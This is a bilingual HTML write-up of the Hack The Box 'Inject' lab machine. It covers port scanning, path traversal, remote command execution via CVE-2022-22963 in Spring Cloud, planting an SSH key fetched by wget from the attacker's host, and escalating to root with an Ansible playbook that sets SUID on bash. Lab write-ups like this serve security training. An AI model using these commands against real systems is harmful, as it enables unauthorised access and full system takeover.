@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Alejandro García Peláez" />
+  <meta name="dcterms.date" content="2023-03-02" />
+  <title>Inject Machine</title>
+  <script src="/src/translation.min.js" defer></script>
+  <style>
+    html {
+      line-height: 1.5;
+      font-family: Georgia, serif;
+      font-size: 14pt;
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 1em;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
+      font-size: 85%;
+      margin: 0;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { color: #008000; } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { color: #008000; font-weight: bold; } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">Inject Machine</h1>
+<p class="author">Alejandro García Peláez</p>
+<p class="date">2023-03-02</p>
+
+<div id="buttons" style="display: grid; justify-content: center;">
+  <button class="spanish button-class" id="lang-en" type="button"> English </button>
+  <button class="english button-class" id="lang-es" type="button"> Español </button>
+</div>
+
+</header>
+<div class="spanish">
+<ul>
+<li><a href="#reconocimiento">Reconocimiento</a><br></li>
+<li><a href="#obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso
+a la máquina víctima</a><br>
+<ul>
+<li><a href="#directory-path-traversal">Directory Path
+Traversal</a><br></li>
+<li><a href="#cve-2022-22963rce">CVE-2022-22963(RCE)</a><br></li>
+</ul></li>
+<li><a href="#escalada-de-privilegios">Escalada de privilegios</a><br>
+<ul>
+<li><a href="#escalada-de-privilegios-de-usuario">Escalada de
+privilegios de usuario</a><br></li>
+<li><a href="#escalada-de-privilegios-a-root">Escalada de privilegios a
+root</a><br></li>
+</ul></li>
+</ul>
+</div>
+<div class="english">
+<ul>
+<li><a href="#recognition">Recognition</a><br></li>
+<li><a href="#gaining-access-to-the-victim-machine">Gaining access to
+the victim machine</a><br>
+<ul>
+<li><a href="#directory-path-traversal">Directory Path
+Traversal</a><br></li>
+<li><a href="#cve-2022-22963rce">CVE-2022-22963(RCE)</a><br></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a><br>
+<ul>
+<li><a href="#user-privileges-escalation">User privileges
+escalation</a><br></li>
+<li><a href="#privilege-escalation-to-root">Privilege escalation to
+root</a><br></li>
+</ul></li>
+</ul>
+</div>
+<div class="spanish">
+<h1 id="reconocimiento">Reconocimiento</h1>
+<p>Comprobamos la disponibilidad de la máquina objetivo:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">ping</span> <span class="at">-c</span> 1 10.10.11.204</span></code></pre></div>
+<p><br></p>
+<pre><code>PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
+64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=46.0 ms
+
+--- 10.10.11.204 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 45.959/45.959/45.959/0.000 ms</code></pre>
+<p><strong>ttl = 63</strong> por tanto nos enfrentamos a una máquina
+Linux por proximidad.</p>
+<p>Comprobamos los servicios expuestos:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p-</span> <span class="at">--open</span> <span class="at">-T5</span> <span class="at">-Pn</span> <span class="at">-n</span> 10.10.11.204 <span class="at">-oG</span> openTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 10:42 CET
+Nmap scan report for 10.10.11.204
+Host is up (0.089s latency).
+Not shown: 43330 closed tcp ports (reset), 22203 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 34.26 seconds</code></pre>
+<p>Extraemos los puertos relevantes y lanzamos una serie de scripts de
+reconocimiento predefinidos por nmap para recopilar información sobre
+los servicios expuestos:</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">grePorts</span></span></code></pre></div>
+<p><br></p>
+<pre><code> [!] Open ports: 22,8080</code></pre>
+<p>Nmap:</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p22,8080</span> <span class="at">-sVC</span> 10.10.11.204 <span class="at">-oN</span> servicesTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 10:52 CET
+Nmap scan report for 10.10.11.204
+Host is up (0.091s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
+|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
+|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.56 seconds</code></pre>
+<h1 id="obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso a la
+máquina víctima</h1>
+<h2 id="directory-path-traversal">Directory Path Traversal</h2>
+<p>Echando un vistazo a la página web accesible a través del puerto 8080
+llegamos a un punto donde subir los archivos; a pesar de intentar pasar
+algunas restricciones, no se puede subir un archivo php, solo acepta
+imágenes; jugando un poco con las peticiones al subir imágenes:</p>
+<p><img src="images/inject1.png" /></p>
+<p>Vía potencial para poder listar directorios y ojear archivos del
+sistema:</p>
+<p><img src="images/inject2.png" /></p>
+<p>Dos usuarios potenciales: phil y frank. Veamos si podemos extraer
+algo de información relevante de los directorios de estos usuarios:</p>
+<p><img src="images/inject3.png" /></p>
+<p>Echando un vistazo a los archivos con los que está construido el
+sitio web no parece haber opción de pasar las restricciones y subir
+algún archivo php. La contraseña anterior tampoco sirve para el usuario
+phil, por lo menos para ssh. Por lo que habrá que seguir indagando.</p>
+<p><img src="images/inject5.png" /></p>
+<h2 id="cve-2022-22963rce">CVE-2022-22963(RCE)</h2>
+<p>La web está programada sobre el framework spring; echando un vistazo
+al “pom.xml” del proyecto maven podemos ver esto y la versión de las
+dependencias. Con una breve búsqueda podemos encontrar la vulnerabilidad
+que afecta a Spring Cloud y la cual nos dará la posibilidad de ejecutar
+comandos de forma remota: CVE-2022-22963.</p>
+<p>Automatizo el exploit para solo tener que introducir el comando
+pertinente, <a href="/cve-exploits/#cve-2022-22963">puedes verlo aquí o
+en la página de CVE exploits</a>.</p>
+<p>Ya con esto podríamos obtener una “reverse shell”, pero prefiero
+obtener una consola por ssh; creo un nuevo par de claves inicio y simple
+servidor web con Python y:</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">./spring_cloud_functionCV</span> 10.10.11.204:8080 <span class="st">&#39;wget http://&lt;htb-ip&gt;:12345/authorized_keys -O /home/frank/.ssh/authorized_keys&#39;</span></span></code></pre></div>
+<p><br></p>
+<pre><code>[!] RCE: The command has been executed
+  [+] Host: 10.10.11.204:8080
+  [+] Command: wget http://&lt;htb-ip&gt;:12345/authorized_keys -O /home/frank/.ssh/authorized_keys
+  [+] Status: OK</code></pre>
+<p>Finalmente:</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">ssh</span> frank@10.10.11.204 <span class="at">-i</span> injectrsa</span></code></pre></div>
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+<h2 id="escalada-de-privilegios-de-usuario">Escalada de privilegios de
+usuario</h2>
+<p>Una vez dentro como el usuario frank utilizamos la contraseña para
+phil que anteriormente hemos visto:</p>
+<p><img src="images/inject6.png" /></p>
+<p>Lo más relevante es que pertenecemos al grupo ‘staff’. Vemos la flag
+del usuario.</p>
+<h2 id="escalada-de-privilegios-a-root">Escalada de privilegios a
+root</h2>
+<p>Tras buscar un poco encuentro un directorio en opt sobre el que el
+grupo “staff” tiene permisos; en él hay un archivo yaml llamado
+“playbook”. Esto parece ser una tarea automática de ansible.</p>
+<p>Echo un vistazo a ver si encuentro la tarea de automatización:</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="kw">[[</span> 1 <span class="ot">-eq</span> 1 <span class="kw">]]</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="cf">do</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a> <span class="fu">ps</span> aux <span class="at">-u</span> root <span class="kw">|</span> <span class="fu">grep</span> ansible</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
+<p>Y el script recopila lo siguiente lo siguiente:</p>
+<pre><code>root       10216  0.0  0.0   2608   596 ?        Ss   13:04   0:00 /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</code></pre>
+<p>Por tanto preparamos un archivo siguiendo la sintaxis YAML para que
+ejecute un comando como root siguiendo la tarea programada:</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="kw">-</span><span class="at"> </span><span class="fu">hosts</span><span class="kw">:</span><span class="at"> localhost</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="fu">tasks</span><span class="kw">:</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> </span><span class="fu">name</span><span class="kw">:</span><span class="at"> </span><span class="st">&quot;4rticf0xwashere&quot;</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="at">      </span><span class="fu">shell</span><span class="kw">:</span><span class="at"> </span><span class="st">&quot;chmod +s /bin/bash&quot;</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="at">      </span><span class="fu">register</span><span class="kw">:</span><span class="at"> </span><span class="st">&quot;output&quot;</span></span></code></pre></div>
+<p>Con esto le damos permisos suid a bash y podemos obtener permisos de
+administrador.</p>
+</div>
+<div class="english">
+<h1 id="recognition">Recognition</h1>
+<p>We check the availability of the target machine:</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">ping</span> <span class="at">-c</span> 1 10.10.11.204</span></code></pre></div>
+<p><br></p>
+<pre><code>PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
+64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=46.0 ms
+
+--- 10.10.11.204 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 45.959/45.959/45.959/0.000 ms</code></pre>
+<p><strong>ttl = 63</strong> so we are dealing with a Linux machine by
+proximity.</p>
+<p>We checked the services on display:</p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p-</span> <span class="at">--open</span> <span class="at">-T5</span> <span class="at">-Pn</span> <span class="at">-n</span> 10.10.11.204 <span class="at">-oG</span> openTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 10:42 CET
+Nmap scan report for 10.10.11.204
+Host is up (0.089s latency).
+Not shown: 43330 closed tcp ports (reset), 22203 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 34.26 seconds</code></pre>
+<p>We extract the relevant ports and launch a series of reconnaissance
+scripts predefined by nmap to gather information about the exposed
+services:</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">grePorts</span></span></code></pre></div>
+<p><br></p>
+<pre><code> [!] Open ports: 22,8080</code></pre>
+<p>Nmap:</p>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p22,8080</span> <span class="at">-sVC</span> 10.10.11.204 <span class="at">-oN</span> servicesTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 10:52 CET
+Nmap scan report for 10.10.11.204
+Host is up (0.091s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
+|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
+|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.56 seconds</code></pre>
+<h1 id="gaining-access-to-the-victim-machine">Gaining access to the
+victim machine</h1>
+<h2 id="directory-path-traversal-1">Directory Path Traversal</h2>
+<p>Taking a look at the web page accessible through port 8080 we arrive
+at a point where to upload files; despite trying to pass some
+restrictions, it is not possible to upload a php file, it only accepts
+images; playing a little with the requests when uploading images:</p>
+<p><img src="images/inject1.png" /></p>
+<p>Potential way to list directories and browse system files:</p>
+<p><img src="images/inject2.png" /></p>
+<p>Two potential users: phil and frank. Let’s see if we can extract some
+relevant information from the directories of these users:</p>
+<p><img src="images/inject3.png" /></p>
+<p>Taking a look at the files the website is built with there doesn’t
+seem to be an option to pass the restrictions and upload any php
+files.The above password does not work for the phil user either, at
+least for ssh. So we will have to investigate further.</p>
+<p><img src="images/inject5.png" /></p>
+<h2 id="cve-2022-22963rce-1">CVE-2022-22963(RCE)</h2>
+<p>The web is programmed on the spring framework; taking a look at the
+“pom.xml” of the maven project we can see this and the version of the
+dependencies.With a brief search we can find the vulnerability that
+affects Spring Cloud and which will give us the possibility to execute
+commands remotely: CVE-2022-22963.</p>
+<p>I automate the exploit so that I only have to enter the relevant
+command, you can see it in the pentesting-web-scripts publication.</p>
+<p>Already with this we could get a “reverse shell”, but I prefer to get
+a console by ssh; I create a new key pair start and simple web server
+with Python:</p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">./spring_cloud_functionCV</span> 10.10.11.204:8080 <span class="st">&#39;wget http://&lt;htb-ip&gt;:12345/authorized_keys -O /home/frank/.ssh/authorized_keys&#39;</span></span></code></pre></div>
+<p><br></p>
+<pre><code>[!] RCE: The command has been executed
+  [+] Host: 10.10.11.204:8080
+  [+] Command: wget http://&lt;htb-ip&gt;:12345/authorized_keys -O /home/frank/.ssh/authorized_keys
+  [+] Status: OK</code></pre>
+<p>Finally:</p>
+<div class="sourceCode" id="cb25"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">ssh</span> frank@10.10.11.204 <span class="at">-i</span> injectrsa</span></code></pre></div>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<h2 id="user-privileges-escalation">User privileges escalation</h2>
+<p>Once inside as the user frank we use the password for phil that we
+have previously seen:</p>
+<p><img src="images/inject6.png" /></p>
+<p>The most relevant thing is that we belong to the ‘staff’ group. We
+see the user’s flag.</p>
+<h2 id="privilege-escalation-to-root">Privilege escalation to root</h2>
+<p>After some searching I find a directory in opt that the “staff” group
+has permissions on; in it is a yaml file called “playbook”. This appears
+to be an automatic ansible task.</p>
+<p>I take a look to see if I can find the automation task:</p>
+<div class="sourceCode" id="cb26"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="kw">[[</span> 1 <span class="ot">-eq</span> 1 <span class="kw">]]</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="cf">do</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a> <span class="fu">ps</span> aux <span class="at">-u</span> root <span class="kw">|</span> <span class="fu">grep</span> ansible</span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
+<p>And the script compiles the following:</p>
+<pre><code>root       10216  0.0  0.0   2608   596 ?        Ss   13:04   0:00 /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</code></pre>
+<p>Therefore we prepare a file following the YAML syntax to execute a
+command as root following the scheduled task:</p>
+<div class="sourceCode" id="cb28"><pre
+class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="kw">-</span><span class="at"> </span><span class="fu">hosts</span><span class="kw">:</span><span class="at"> localhost</span></span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="fu">tasks</span><span class="kw">:</span></span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> </span><span class="fu">name</span><span class="kw">:</span><span class="at"> </span><span class="st">&quot;4rticf0xwashere&quot;</span></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="at">      </span><span class="fu">shell</span><span class="kw">:</span><span class="at"> </span><span class="st">&quot;chmod +s /bin/bash&quot;</span></span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="at">      </span><span class="fu">register</span><span class="kw">:</span><span class="at"> </span><span class="st">&quot;output&quot;</span></span></code></pre></div>
+<p>With this we give suid permissions to bash and we can get
+administrator permissions.</p>
+</div>
+</body>
+</html>
+
+<style>
+
+html{
+  background-color: #f5f5fa;
+}
+
+body{
+  background-color: white;
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+}
+
+.hidden{
+  display: none
+}
+
+.block{
+  display: block;
+}
+
+h1{
+  font-size: 19pt;
+}
+
+h2{
+  font-size: 16pt;
+}
+
+h3{
+  font-size: 14pt;
+}
+
+.button-class{
+  cursor: pointer;
+  --tw-border-opacity: 1;
+  border-color: rgb(0 0 0 / var(--tw-border-opacity));
+  border-width: 2px;
+  margin-top: 0.5rem;
+  background-color: transparent;
+  background-image: none;
+  font-family: inherit;
+  font-feature-settings: inherit;
+  font-variation-settings: inherit;
+  font-size: 100%;
+  font-weight: inherit;
+  line-height: inherit;
+  color: inherit;
+  --tw-border-spacing-x: 0;
+  --tw-border-spacing-y: 0;
+  --tw-translate-x: 0;
+  --tw-translate-y: 0;
+  --tw-rotate: 0;
+  --tw-skew-x: 0;
+  --tw-skew-y: 0;
+  --tw-scale-x: 1;
+  --tw-scale-y: 1;
+  --tw-pan-x: ;
+  --tw-pan-y: ;
+  --tw-pinch-zoom: ;
+  --tw-scroll-snap-strictness: proximity;
+  --tw-gradient-from-position: ;
+  --tw-gradient-via-position: ;
+  --tw-gradient-to-position: ;
+  --tw-ordinal: ;
+  --tw-slashed-zero: ;
+  --tw-numeric-figure: ;
+  --tw-numeric-spacing: ;
+  --tw-numeric-fraction: ;
+  --tw-ring-inset: ;
+  --tw-ring-offset-width: 0px;
+  --tw-ring-offset-color: #fff;
+  --tw-ring-color: rgb(59 130 246 / 0.5);
+  --tw-ring-offset-shadow: 0 0 #0000;
+  --tw-ring-shadow: 0 0 #0000;
+  --tw-shadow: 0 0 #0000;
+  --tw-shadow-colored: 0 0 #0000;
+  --tw-blur: ;
+  --tw-brightness: ;
+  --tw-contrast: ;
+  --tw-grayscale: ;
+  --tw-hue-rotate: ;
+  --tw-invert: ;
+  --tw-saturate: ;
+  --tw-sepia: ;
+  --tw-drop-shadow: ;
+  --tw-backdrop-blur: ;
+  --tw-backdrop-brightness: ;
+  --tw-backdrop-contrast: ;
+  --tw-backdrop-grayscale: ;
+  --tw-backdrop-hue-rotate: ;
+  --tw-backdrop-invert: ;
+  --tw-backdrop-opacity: ;
+  --tw-backdrop-saturate: ;
+  --tw-backdrop-sepia: ;
+  border-style: solid;
+  box-sizing: border-box;
+  --tw-bg-opacity: 1;
+}
+</style>
